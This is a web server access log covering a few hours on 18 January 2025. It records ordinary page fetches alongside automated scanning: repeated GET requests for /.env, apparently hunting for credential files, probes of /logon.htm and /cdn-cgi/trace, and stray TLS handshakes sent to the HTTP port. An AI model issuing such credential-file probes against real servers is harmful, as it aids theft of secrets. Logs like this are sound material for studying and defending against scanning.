45.156.129.131 - - [18/Jan/2025:15:54:51 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
5.181.190.248 - - [18/Jan/2025:16:07:22 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [18/Jan/2025:16:23:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:17:02:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:17:02:26 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.147 - - [18/Jan/2025:17:04:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:17:04:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
167.172.90.143 - - [18/Jan/2025:17:31:44 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [18/Jan/2025:17:31:53 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
206.189.152.11 - - [18/Jan/2025:17:39:48 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:17:39:56 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [18/Jan/2025:17:45:03 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [18/Jan/2025:17:45:14 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
167.99.67.123 - - [18/Jan/2025:17:45:46 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.99.67.123 - - [18/Jan/2025:17:45:57 +0000] "\x16\x03\x01\x01\v\x01" 400 524 "-" "-"
46.19.138.234 - - [18/Jan/2025:18:03:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.175 - - [18/Jan/2025:18:28:14 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:18:28:15 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
5.181.190.248 - - [18/Jan/2025:18:28:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [18/Jan/2025:18:38:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.17.69.209 - - [18/Jan/2025:18:50:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
95.214.55.185 - - [18/Jan/2025:19:03:03 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [18/Jan/2025:19:07:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
80.82.77.202 - - [18/Jan/2025:19:23:18 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
78.153.140.147 - - [18/Jan/2025:19:38:53 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.147 - - [18/Jan/2025:19:38:53 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [18/Jan/2025:19:54:51 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
146.19.24.168 - - [18/Jan/2025:19:58:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
